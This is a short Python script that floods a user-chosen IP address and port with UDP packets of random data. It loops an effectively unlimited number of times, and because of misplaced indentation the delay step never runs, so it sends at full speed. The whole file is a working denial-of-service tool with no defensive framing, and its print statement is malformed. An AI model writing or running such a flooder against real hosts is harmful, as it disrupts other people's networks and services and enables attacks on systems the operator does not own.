import socket, random, time 

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

ip = input("enter Target IP:")
port =int (input("enter target port:"))
sleep = float(input("sleep: "))

s.connect((ip,port))

#print (random._urandom(10)*1000)

for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
print(f"send: (i))", end ='\r')
time.sleep(sleep)



